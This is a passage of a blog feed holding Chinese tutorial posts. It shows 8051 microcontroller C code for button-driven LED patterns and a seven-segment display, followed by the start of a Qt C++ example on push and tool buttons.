class="hljs-number">1</span>) &#123;<br>        <span class="hljs-keyword">if</span> (P3_1 == <span class="hljs-number">0</span>) &#123;<br>            P2_0 = <span class="hljs-number">0</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            P2_0 = <span class="hljs-number">1</span>;<br>        &#125;<br>    &#125;<br>   <br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>跳过单次按键的周期（按一次改变一次灯）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;REGX52.H&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;intrins.h&gt;</span></span><br>   <br><span class="hljs-keyword">typedef</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> u16;<br><span class="hljs-keyword">typedef</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> u8;<br><span class="hljs-meta">#<span class="hljs-keyword">define</span> LED_PORT P2</span><br>   <br><span class="hljs-type">void</span> <span class="hljs-title function_">Delay</span><span class="hljs-params">(u16 xms)</span> <span class="hljs-comment">//@11.0592MHz</span><br>&#123;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> data i, j;<br>    <span class="hljs-keyword">while</span> (xms--) &#123;<br>        _nop_();<br>        i = <span class="hljs-number">2</span>;<br>        j = <span class="hljs-number">199</span>;<br>        <span class="hljs-keyword">do</span> &#123;<br>            <span class="hljs-keyword">while</span> (--j)<br>                ;<br>        &#125; <span class="hljs-keyword">while</span> (--i);<br>    &#125;<br>&#125;<br>   <br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    u8 i = <span class="hljs-number">0</span>;<br>    P2   = <span class="hljs-number">0x0F</span>;<br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) &#123;<br>        <span class="hljs-keyword">if</span> (P3_1 == <span class="hljs-number">0</span>) &#123;<br>            Delay(<span class="hljs-number">20</span>);<span class="hljs-comment">//begin</span><br>            <span class="hljs-keyword">while</span> (P3_1 == <span class="hljs-number">0</span>);<br>            Delay(<span class="hljs-number">20</span>);<span class="hljs-comment">//end   这个部分是一个按键检查的周期</span><br>            <br>            <br>            P2 = ~P2;<br>        &#125;<br>    &#125;<br>   <br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>独立按键控制灯的移位</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;REGX52.H&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;intrins.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> LED_PORT P2</span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> u16;<br><span class="hljs-keyword">typedef</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> u8;<br><span class="hljs-keyword">typedef</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> u4;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">Delay</span><span class="hljs-params">(u16 xms)</span> <span class="hljs-comment">//@11.0592MHz</span><br>&#123;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> data i, j;<br>    <span class="hljs-keyword">while</span> (xms--) &#123;<br>        _nop_();<br>        i = <span class="hljs-number">2</span>;<br>        j = <span class="hljs-number">199</span>;<br>        <span class="hljs-keyword">do</span> &#123;<br>            <span class="hljs-keyword">while</span> (--j)<br>                ;<br>        &#125; <span class="hljs-keyword">while</span> (--i);<br>    &#125;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    u8 i = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> LEDNum;<br><br>    P2 = <span class="hljs-number">0x00</span>;<br>    Delay(<span class="hljs-number">500</span>);<br>    P2 = <span class="hljs-number">0xFE</span>;<br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) &#123;<br>        <br>        <span class="hljs-comment">//往右移</span><br>        <span class="hljs-keyword">if</span> (P3_1 == <span class="hljs-number">0</span>) &#123;<br>            Delay(<span class="hljs-number">20</span>);<br>            <span class="hljs-keyword">while</span> (P3_1 == <span class="hljs-number">0</span>)<br>                ;<br>            Delay(<span class="hljs-number">20</span>);<br><br>            P2 = _cror_(P2, <span class="hljs-number">1</span>);<br>        &#125;<br>        <br>        <span class="hljs-comment">//往左移</span><br>        <span class="hljs-keyword">if</span> (P3_3 == <span class="hljs-number">0</span>) &#123;<br>            Delay(<span class="hljs-number">20</span>);<br>            <span class="hljs-keyword">while</span> (P3_3 == <span class="hljs-number">0</span>)<br>                ;<br>            Delay(<span class="hljs-number">20</span>);<br><br>            P2 = _crol_(P2, <span class="hljs-number">1</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>总结，下面的代码是运用上面的知识写出来的按键灯光秀</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;REGX52.H&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;intrins.h&gt;</span></span><br>   <br><span class="hljs-meta">#<span class="hljs-keyword">define</span> LED_PORT P2</span><br>   <br><span class="hljs-keyword">typedef</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> u16;<br><span class="hljs-keyword">typedef</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> u8;<br><span class="hljs-keyword">typedef</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> u4;<br>   <br><span class="hljs-type">void</span> <span class="hljs-title function_">Delay</span><span class="hljs-params">(u16 xms)</span> <span class="hljs-comment">//@11.0592MHz</span><br>&#123;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> data i, j;<br>    <span class="hljs-keyword">while</span> (xms--) &#123;<br>        _nop_();<br>        i = <span class="hljs-number">2</span>;<br>        j = <span class="hljs-number">199</span>;<br>        <span class="hljs-keyword">do</span> &#123;<br>            <span class="hljs-keyword">while</span> (--j)<br>                ;<br>        &#125; <span class="hljs-keyword">while</span> (--i);<br>    &#125;<br>&#125;<br>   <br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    u8 i = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> LEDNum;<br>   <br>    P2 = <span class="hljs-number">0x00</span>;<br>    Delay(<span class="hljs-number">500</span>);<br>    P2 = <span class="hljs-number">0xFE</span>;<br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) &#123;<br>        <span class="hljs-keyword">if</span> (P3_1 == <span class="hljs-number">0</span>) &#123;<br>            Delay(<span class="hljs-number">20</span>);<br>            <span class="hljs-keyword">while</span> (P3_1 == <span class="hljs-number">0</span>)<br>                ;<br>            Delay(<span class="hljs-number">20</span>);<br>   <br>            P2 = _cror_(P2, <span class="hljs-number">1</span>);<br>        &#125;<br>   <br>        <span class="hljs-keyword">if</span> (P3_3 == <span class="hljs-number">0</span>) &#123;<br>            Delay(<span class="hljs-number">20</span>);<br>            <span class="hljs-keyword">while</span> (P3_3 == <span class="hljs-number">0</span>)<br>                ;<br>            Delay(<span class="hljs-number">20</span>);<br>   <br>            P2 = _crol_(P2, <span class="hljs-number">1</span>);<br>        &#125;<br>   <br>        <span class="hljs-keyword">if</span> (P3_0 == <span class="hljs-number">0</span>) &#123;<br>            Delay(<span class="hljs-number">20</span>);<br>            <span class="hljs-keyword">while</span> (P3_0 == <span class="hljs-number">0</span>)<br>                ;<br>            Delay(<span class="hljs-number">20</span>);<br>   <br>            <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">7</span>; i++) &#123;<br>                LED_PORT = _crol_(LED_PORT, <span class="hljs-number">1</span>); <span class="hljs-comment">//往左移</span><br>                Delay(<span class="hljs-number">100</span>);<br>            &#125;<br>            <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">7</span>; i++) &#123;<br>                LED_PORT = _cror_(LED_PORT, <span class="hljs-number">1</span>); <span class="hljs-comment">//往右移</span><br>                Delay(<span class="hljs-number">100</span>);<br>            &#125;<br>   <br>            P3_0 = <span class="hljs-number">1</span>;<br>        &#125;<br>   <br>        <span class="hljs-keyword">if</span> (P3_2 == <span class="hljs-number">0</span>) &#123;<br>            Delay(<span class="hljs-number">20</span>);<br>            <span class="hljs-keyword">while</span> (P3_2 == <span class="hljs-number">0</span>)<br>                ;<br>            Delay(<span class="hljs-number">20</span>);<br>   <br>            <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">3</span>; i++) &#123;<br>                LED_PORT = _crol_(LED_PORT, <span class="hljs-number">2</span>); <span class="hljs-comment">//往左移</span><br>                Delay(<span class="hljs-number">100</span>);<br>            &#125;<br>            <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">3</span>; i++) &#123;<br>                LED_PORT = _cror_(LED_PORT, <span class="hljs-number">2</span>); <span class="hljs-comment">//往右移</span><br>                Delay(<span class="hljs-number">100</span>);<br>            &#125;<br>   <br>            P3_2 = <span class="hljs-number">1</span>;<br>        &#125;<br>    &#125;<br>   <br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure></li></ol><h2 id="数码管"><a href="#数码管" class="headerlink" title="数码管"></a>数码管</h2><h3 id="静态数码管"><a href="#静态数码管" class="headerlink" title="静态数码管"></a>静态数码管</h3><ol><li><p>点亮一个数码管的数字</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;REGX52.H&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;intrins.h&gt;</span></span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> u16;<br><span class="hljs-keyword">typedef</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> u8;<br><span class="hljs-keyword">typedef</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> u4;<br><br><span class="hljs-comment">//在led打印的数组</span><br>u4 printLedNum[<span class="hljs-number">10</span>] = &#123;<span class="hljs-number">0x3F</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x5B</span>, <span class="hljs-number">0x4F</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0x6D</span>, <span class="hljs-number">0x7D</span>,<span class="hljs-number">0x07</span>,<span class="hljs-number">0x7F</span>,<span class="hljs-number">0x6F</span>&#125;;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">Delay</span><span class="hljs-params">(u16 xms)</span> <span class="hljs-comment">//@11.0592MHz</span><br>&#123;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> data i, j;<br>    <span class="hljs-keyword">while</span> (xms--) &#123;<br>        _nop_();<br>        i = <span class="hljs-number">2</span>;<br>        j = <span class="hljs-number">199</span>;<br>        <span class="hljs-keyword">do</span> &#123;<br>            <span class="hljs-keyword">while</span> (--j)<br>                ;<br>        &#125; <span class="hljs-keyword">while</span> (--i);<br>    &#125;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">printSix</span><span class="hljs-params">()</span><br>&#123;<br>    P2_2 = <span class="hljs-number">1</span>;<br>    P2_3 = <span class="hljs-number">0</span>;<br>    P2_4 = <span class="hljs-number">1</span>;<br><br>    P0 = <span class="hljs-number">0x7D</span>;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">DigitalTube</span><span class="hljs-params">(u4 LEDNum, u4 num)</span><br>&#123;<br>    <span class="hljs-keyword">switch</span> (LEDNum) &#123;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>            P2_2 = <span class="hljs-number">1</span>;<br>            P2_3 = <span class="hljs-number">1</span>;<br>            P2_4 = <span class="hljs-number">1</span>;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>            P2_2 = <span class="hljs-number">0</span>;<br>            P2_3 = <span class="hljs-number">1</span>;<br>            P2_4 = <span class="hljs-number">1</span>;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">3</span>:<br>            P2_2 = <span class="hljs-number">1</span>;<br>            P2_3 = <span class="hljs-number">0</span>;<br>            P2_4 = <span class="hljs-number">1</span>;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">4</span>:<br>            P2_2 = <span class="hljs-number">0</span>;<br>            P2_3 = <span class="hljs-number">0</span>;<br>            P2_4 = <span class="hljs-number">1</span>;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">5</span>:<br>            P2_2 = <span class="hljs-number">1</span>;<br>            P2_3 = <span class="hljs-number">1</span>;<br>            P2_4 = <span class="hljs-number">0</span>;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">6</span>:<br>            P2_2 = <span class="hljs-number">0</span>;<br>            P2_3 = <span class="hljs-number">1</span>;<br>            P2_4 = <span class="hljs-number">0</span>;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">7</span>:<br>            P2_2 = <span class="hljs-number">1</span>;<br>            P2_3 = <span class="hljs-number">0</span>;<br>            P2_4 = <span class="hljs-number">0</span>;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">8</span>:<br>            P2_2 = <span class="hljs-number">0</span>;<br>            P2_3 = <span class="hljs-number">0</span>;<br>            P2_4 = <span class="hljs-number">0</span>;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">default</span>:<br>            <span class="hljs-keyword">break</span>;<br>    &#125;<br><br>    P0 = printLedNum[num];<br><br>    <span class="hljs-comment">//由于led电子管的使用饭方式是 位选  段选   位选  段选，每一个（位选 段选）是一个集合，控制一个LED</span><br>    <span class="hljs-comment">//但是由于运行效率极高，所以上阶段段选会进入到下一阶段的位选当中，所以我们需要人为的进行消影</span><br>    Delay(<span class="hljs-number">1</span>);<span class="hljs-comment">//这里延迟的原因是因为，直接归零的话显示的效果就会不明显</span><br>    P0=<span class="hljs-number">0x00</span>;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) &#123;<br>        DigitalTube(<span class="hljs-number">1</span>, <span class="hljs-number">1</span>);<br>        DigitalTube(<span class="hljs-number">3</span>, <span class="hljs-number">3</span>);<br>        DigitalTube(<span class="hljs-number">5</span>, <span class="hljs-number">5</span>);<br>        DigitalTube(<span class="hljs-number">7</span>, <span class="hljs-number">7</span>);<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure></li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>51单片机</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>QT控件认识</title>
    <link href="/2023/08/03/QT/QT%E6%8E%A7%E4%BB%B6%E8%AE%A4%E8%AF%86/"/>
    <url>/2023/08/03/QT/QT%E6%8E%A7%E4%BB%B6%E8%AE%A4%E8%AF%86/</url>
    
    <content type="html"><![CDATA[<h1 id="QT控件认识"><a href="#QT控件认识" class="headerlink" title="QT控件认识"></a>QT控件认识</h1><p>学习控件需要培养起来查帮助文档的习惯</p><p>首先我们查父类，按照以下顺序</p><p>信号-&gt;槽函数-&gt;public function-&gt;others</p><h2 id="按钮"><a href="#按钮" class="headerlink" title="按钮"></a>按钮</h2><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/qt/qt1/image-20230811212601338.png" alt="image-20230811212601338"></p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/others/qt/%E6%8E%A7%E4%BB%B6%E6%8C%89%E9%92%AE%E7%9A%84%E7%BB%A7%E6%89%BF%E5%85%B3%E7%B3%BB" alt="image-20230803091229228"></p><h3 id="QAbstractButton"><a href="#QAbstractButton" class="headerlink" title="QAbstractButton"></a>QAbstractButton</h3><ol><li><p>槽函数</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/others/qt/%E6%8E%A7%E4%BB%B6QAbstractButton%E6%A7%BD%E5%87%BD%E6%95%B0" alt="image-20230803092521012"></p></li><li><p>信号</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/others/qt/%E6%8E%A7%E4%BB%B6qabstractButton" alt="image-20230803092957579"></p></li></ol><h3 id="QPushButton"><a href="#QPushButton" class="headerlink" title="QPushButton"></a>QPushButton</h3><ol><li><p>普通的按钮，继承于QAstrctButton</p></li><li><p>下面是具体的用法</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs c++">qtTest_control::<span class="hljs-built_in">qtTest_control</span>(QWidget *parent)<br>    : <span class="hljs-built_in">QMainWindow</span>(parent)<br>&#123;<br>    ui.<span class="hljs-built_in">setupUi</span>(<span class="hljs-keyword">this</span>);<br>   <br>    <span class="hljs-comment">//普通按钮</span><br>    ui.nomalBtu-&gt;<span class="hljs-built_in">setText</span>(<span class="hljs-string">&quot;屌丝&quot;</span>);<br>    ui.nomalBtu-&gt;<span class="hljs-built_in">setIcon</span>(<span class="hljs-built_in">QIcon</span>(<span class="hljs-string">&quot;:/1&quot;</span>));<br>   <br>   <br>   <br>    <span class="hljs-comment">//check按钮</span><br>    ui.checkBtn-&gt;<span class="hljs-built_in">setCheckable</span>(<span class="hljs-literal">true</span>);<span class="hljs-comment">//设置成可选中的状态，也就是颜色会加深</span><br>    ui.checkBtn-&gt;<span class="hljs-built_in">setText</span>(<span class="hljs-string">&quot;屌丝二号&quot;</span>);<br>    ui.checkBtn-&gt;<span class="hljs-built_in">setIcon</span>(<span class="hljs-built_in">QIcon</span>(<span class="hljs-string">&quot;:/2&quot;</span>));<br>   <br>    <span class="hljs-built_in">connect</span>(ui.checkBtn, &amp;QPushButton::toggled, <span class="hljs-keyword">this</span>, [=]() &#123;<br>        QMessageBox::<span class="hljs-built_in">information</span>(<span class="hljs-keyword">this</span>, <span class="hljs-string">&quot;check&quot;</span>,<span class="hljs-string">&quot;你是大屌丝二号&quot;</span>);<br>   <br>        &#125;);<span class="hljs-comment">//当点击的是子图标，发出信号</span><br>   <br>   <br>    <span class="hljs-comment">//关联按钮</span><br>    QMenu* menuForwithMenu = <span class="hljs-keyword">new</span> <span class="hljs-built_in">QMenu</span>(<span class="hljs-literal">nullptr</span>);<br>    QAction* act1=menuForwithMenu-&gt;<span class="hljs-built_in">addAction</span>(<span class="hljs-built_in">QIcon</span>(<span class="hljs-string">&quot;://3&quot;</span>), <span class="hljs-string">&quot;选项一&quot;</span>);<br>    ui.withMenu-&gt;<span class="hljs-built_in">setMenu</span>(menuForwithMenu);<br>    <span class="hljs-built_in">connect</span>(act1, &amp;QAction::triggered, <span class="hljs-keyword">this</span>, [=]() &#123;<br>        QMessageBox::<span class="hljs-built_in">information</span>(<span class="hljs-keyword">this</span>, <span class="hljs-string">&quot;选项&quot;</span>, <span class="hljs-string">&quot;这个是选项一&quot;</span>);<br>        &#125;);<br>   <br>   <br>   <br>&#125;<br></code></pre></td></tr></table></figure></li></ol><h3 id="QToolButton"><a href="#QToolButton" class="headerlink" title="QToolButton"></a>QToolButton</h3><ol><li><p>加强版的QPushButton，并且做的更漂亮 </p></li><li><p>设置图标的方式</p><p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/others/qt/%E6%8E%A7%E4%BB%B6qtoolButton%E8%AE%BE%E7%BD%AE%E5%9B%BE%E6%A0%87%E7%9A%84%E6%96%B9%E5%BC%8F" alt="image-20230803141949916"></p></li><li><p>下面是一些具体的做法</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">//toolButton   图片</span><br>QAction* atc2 = <span class="hljs-keyword">new</span> <span class="hljs-built_in">QAction</span>(<span class="hljs-built_in">QIcon</span>(<span class="hljs-string">&quot;:/4&quot;</span>),<span class="hljs-string">&quot;图片按钮&quot;</span>);<br>ui.pictureToolBtn-&gt;<span class="hljs-built_in">setDefaultAction</span>(atc2);<br><span class="hljs-built_in">connect</span>(atc2, &amp;QAction::triggered, <span class="hljs-keyword">this</span>, [=]() &#123;<br>    atc2-&gt;<span class="hljs-built_in">setIcon</span>(<span class="hljs-built_in">QIcon</span>(<span class="hljs-string">&quot;:/5&quot;</span>));<br>    atc2-&gt;<span class="hljs-built_in">setText</span>(<span class="hljs-string">&quot;新的图片&quot;</span>);<br>    &#125;);<br>ui.pictureToolBtn-&gt;<span class="hljs-built_in">setToolButtonStyle</span>(Qt::ToolButtonTextUnderIcon);<br>   <br>   <br><span class="hljs-comment">//toolButton   箭头</span><br>ui.arrowBtn-&gt;<span class="hljs-built_in">setArrowType</span>(Qt::UpArrow);<br>ui.arrowBtn-&gt;<span class="hljs-built_in">setText</span>(<span class="hljs-string">&quot;向上&quot;</span>);<br>ui.arrowBtn-&gt;<span class="hljs-built_in">setToolButtonStyle</span>(Qt::ToolButtonTextUnderIcon);<br>   <br><span class="hljs-built_in">connect</span>(ui.arrowBtn, &amp;QToolButton::clicked, <span class="hljs-keyword">this</span>, [=]() 